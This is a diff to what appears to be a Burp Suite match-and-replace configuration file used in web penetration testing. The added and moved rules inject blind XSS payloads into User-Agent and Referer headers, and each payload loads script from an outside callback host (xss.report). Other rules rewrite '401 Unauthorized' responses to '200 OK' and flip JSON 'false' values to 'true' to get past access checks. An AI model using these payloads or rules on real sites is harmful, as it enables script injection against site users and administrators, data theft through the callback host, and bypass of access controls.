@@ -146,6 +146,38 @@
                 "string_replace":"Referer: var a=document.createElement(\"script\");a.src=\"//xss.report/s/rix4uni\";document.body.appendChild(a);"
             },
             {
+                "comment":"Finding XSS on User-Agent Custom Payload1",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: </script><script src=//xss.report/s/rix4uni></script>"
+            },
+            {
+                "comment":"Finding XSS on Referer Custom Payload1",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^Referer.*$",
+                "string_replace":"Referer: </script><script src=//xss.report/s/rix4uni></script>"
+            },
+            {
+                "comment":"Finding XSS on User-Agent Custom Payload2",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^User-Agent.*$",
+                "string_replace":"User-Agent: '\"></title></textarea></script></style></noscript><script src=//xss.report/s/rix4uni></script>"
+            },
+            {
+                "comment":"Finding XSS on Referer Custom Payload2",
+                "enabled":false,
+                "is_simple_match":false,
+                "rule_type":"request_header",
+                "string_match":"^Referer.*$",
+                "string_replace":"Referer: '\"></title></textarea></script></style></noscript><script src=//xss.report/s/rix4uni></script>"
+            },
+            {
                 "comment":"302",
                 "enabled":true,
                 "is_simple_match":false,
@@ -162,20 +194,20 @@
                 "string_replace":"200 OK"
             },
             {
-                "comment":"Finding XSS on User-Agent Custom Payload1",
+                "comment":"401 Unauthorized",
                 "enabled":true,
                 "is_simple_match":false,
-                "rule_type":"request_header",
-                "string_match":"^User-Agent.*$",
-                "string_replace":"User-Agent: </script><script src=//xss.report/s/rix4uni></script>"
+                "rule_type":"response_header",
+                "string_match":"401 Unauthorized",
+                "string_replace":"200 OK"
             },
             {
-                "comment":"Finding XSS on User-Agent Custom Payload2",
+                "comment":"Response Manipulation",
                 "enabled":true,
                 "is_simple_match":false,
-                "rule_type":"request_header",
-                "string_match":"^User-Agent.*$",
-                "string_replace":"User-Agent: '\"></title></textarea></script></style></noscript><script src=//xss.report/s/rix4uni></script>"
+                "rule_type":"response_body",
+                "string_match":"\":false,",
+                "string_replace":"\":true,"
             }
         ]
     }
